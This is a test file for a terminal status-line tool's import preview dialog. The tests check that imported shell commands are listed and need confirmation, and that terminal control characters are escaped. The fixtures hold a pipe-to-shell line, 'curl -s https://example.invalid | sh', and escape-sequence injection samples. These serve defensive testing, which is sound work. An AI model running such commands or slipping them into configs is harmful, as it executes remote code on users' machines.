import { render } from 'ink';
import { PassThrough } from 'node:stream';
import React from 'react';
import stripAnsi from 'strip-ansi';
import {
    describe,
    expect,
    it,
    vi
} from 'vitest';

import {
    DEFAULT_SETTINGS,
    type Settings
} from '../../../types/Settings';
import { waitFor } from '../../__tests__/helpers/wait-for-ink';
import {
    ImportPreviewDialog,
    escapeControlCharacters,
    getImportPreviewKeys,
    getImportPreviewSettings,
    getImportedCommands
} from '../ImportPreviewDialog';

class MockTtyStream extends PassThrough {
    isTTY = true;
    columns = 120;
    rows = 40;

    setRawMode() {
        return this;
    }

    ref() {
        return this;
    }

    unref() {
        return this;
    }
}

interface CapturedWriteStream extends NodeJS.WriteStream {
    clearOutput: () => void;
    getOutput: () => string;
}

function createMockStdin(): NodeJS.ReadStream {
    return new MockTtyStream() as unknown as NodeJS.ReadStream;
}

function createMockStdout(): CapturedWriteStream {
    const stream = new MockTtyStream();
    const chunks: string[] = [];

    stream.on('data', (chunk: Buffer | string) => {
        chunks.push(chunk.toString());
    });

    return Object.assign(stream as unknown as NodeJS.WriteStream, {
        clearOutput() {
            chunks.length = 0;
        },
        getOutput() {
            return stripAnsi(chunks.join(''));
        }
    });
}

describe('ImportPreviewDialog helpers', () => {
    it('includes optional settings that exist only in the imported config', () => {
        const current: Settings = { ...DEFAULT_SETTINGS };
        const imported: Settings = {
            ...DEFAULT_SETTINGS,
            defaultSeparator: ' | ',
            overrideForegroundColor: 'green'
        };

        expect('defaultSeparator' in current).toBe(false);
        expect('overrideForegroundColor' in current).toBe(false);
        expect(getImportPreviewKeys(current, imported)).toEqual(
            expect.arrayContaining(['defaultSeparator', 'overrideForegroundColor'])
        );
    });

    it('previews only explicitly imported fields in merge mode', () => {
        const current: Settings = {
            ...DEFAULT_SETTINGS,
            flexMode: 'full',
            lines: [[{ id: 'custom', type: 'model' }]]
        };
        const validation = {
            status: 'valid' as const,
            data: { ...DEFAULT_SETTINGS, globalBold: true },
            presentKeys: ['version', 'globalBold'] as (keyof Settings)[]
        };

        const preview = getImportPreviewSettings(current, validation, 'merge');

        expect(preview.globalBold).toBe(true);
        expect(preview.flexMode).toBe('full');
        expect(preview.lines).toEqual(current.lines);
    });

    it('updates the dynamic preview when merge mode is highlighted', async () => {
        const stdin = createMockStdin();
        const stdout = createMockStdout();
        const stderr = createMockStdout();
        const current: Settings = {
            ...DEFAULT_SETTINGS,
            flexMode: 'full-minus-40'
        };
        const instance = render(React.createElement(ImportPreviewDialog, {
            validation: {
                status: 'valid',
                data: { ...DEFAULT_SETTINGS, globalBold: true },
                presentKeys: ['version', 'globalBold']
            },
            currentSettings: current,
            onApply: () => undefined,
            onCancel: () => undefined
        }), {
            stdin,
            stdout,
            stderr,
            debug: true,
            exitOnCtrlC: false,
            patchConsole: false
        });

        try {
            await waitFor(() => {
                expect(stdout.getOutput()).toContain('flexMode: full-minus-40 → full');
            });

            stdout.clearOutput();
            stdin.write('\u001B[B');
            await waitFor(() => {
                const output = stdout.getOutput();
                const lastFlexModeRow = output.slice(output.lastIndexOf('flexMode:')).split('\n')[0];
                expect(lastFlexModeRow).toBe('flexMode: full-minus-40');
            });
        } finally {
            instance.unmount();
            instance.cleanup();
            stdin.destroy();
            stdout.destroy();
            stderr.destroy();
        }
    });

    it('lists the shell commands an import would add, but not ones already set', () => {
        const current: Settings = {
            ...DEFAULT_SETTINGS,
            lines: [[{ id: 'mine', type: 'custom-command', commandPath: 'date' }], [], []]
        };
        const imported: Settings = {
            ...DEFAULT_SETTINGS,
            lines: [[
                { id: 'a', type: 'custom-command', commandPath: 'date' },
                { id: 'b', type: 'custom-command', commandPath: 'curl -s https://example.invalid | sh' },
                { id: 'c', type: 'custom-command', commandPath: 'curl -s https://example.invalid | sh' }
            ], [], []]
        };

        expect(getImportedCommands(current, imported)).toEqual(['curl -s https://example.invalid | sh']);
        expect(getImportedCommands(current, current)).toEqual([]);
    });

    it('shows control characters as text instead of sending them to the terminal', () => {
        expect(escapeControlCharacters('a\u001b]52;c;AAAA\u0007b\u009b')).toBe('a\\u001b]52;c;AAAA\\u0007b\\u009b');
        expect(escapeControlCharacters('plain ✓')).toBe('plain ✓');
    });

    it('shows the full command an import adds, and asks before applying it', async () => {
        const stdin = createMockStdin();
        const stdout = createMockStdout();
        const stderr = createMockStdout();
        const onApply = vi.fn();
        const command = 'curl -s https://example.invalid/a-long-path-that-would-be-truncated | sh';
        const instance = render(React.createElement(ImportPreviewDialog, {
            validation: {
                status: 'valid',
                data: { ...DEFAULT_SETTINGS, lines: [[{ id: 'c', type: 'custom-command', commandPath: `${command}\u001b[2J` }], [], []] },
                presentKeys: ['version', 'lines']
            },
            currentSettings: DEFAULT_SETTINGS,
            onApply,
            onCancel: () => undefined
        }), {
            stdin,
            stdout,
            stderr,
            debug: true,
            exitOnCtrlC: false,
            patchConsole: false
        });

        try {
            await waitFor(() => {
                expect(stdout.getOutput()).toContain(`${command}\\u001b[2J`);
                expect(stdout.getOutput()).toContain('shell commands that run on every status line render');
            });

            stdin.write('\r');
            await waitFor(() => {
                expect(stdout.getOutput()).toContain('▶  Cancel');
                expect(stdout.getOutput()).toContain('Apply and run these commands');
            });
            expect(onApply).not.toHaveBeenCalled();

            stdout.clearOutput();
            stdin.write('\r');
            await waitFor(() => {
                expect(stdout.getOutput()).toContain('▶  Replace All');
            });
            expect(onApply).not.toHaveBeenCalled();

            stdin.write('\r');
            await waitFor(() => {
                expect(stdout.getOutput()).toContain('▶  Cancel');
            });
            stdin.write('\u001B[B');
            await waitFor(() => {
                expect(stdout.getOutput()).toContain('▶  Apply and run these commands');
            });
            stdin.write('\r');
            await waitFor(() => {
                expect(onApply).toHaveBeenCalledWith('replace');
            });
        } finally {
            instance.unmount();
            instance.cleanup();
            stdin.destroy();
            stdout.destroy();
            stderr.destroy();
        }
    });

    it('applies an import without shell commands straight away', async () => {
        const stdin = createMockStdin();
        const stdout = createMockStdout();
        const stderr = createMockStdout();
        const onApply = vi.fn();
        const instance = render(React.createElement(ImportPreviewDialog, {
            validation: {
                status: 'valid',
                data: { ...DEFAULT_SETTINGS, globalBold: true },
                presentKeys: ['version', 'globalBold']
            },
            currentSettings: DEFAULT_SETTINGS,
            onApply,
            onCancel: () => undefined
        }), {
            stdin,
            stdout,
            stderr,
            debug: true,
            exitOnCtrlC: false,
            patchConsole: false
        });

        try {
            await waitFor(() => {
                expect(stdout.getOutput()).toContain('▶  Replace All');
            });
            stdin.write('\r');
            await waitFor(() => {
                expect(onApply).toHaveBeenCalledWith('replace');
            });
        } finally {
            instance.unmount();
            instance.cleanup();
            stdin.destroy();
            stdout.destroy();
            stderr.destroy();
        }
    });
});
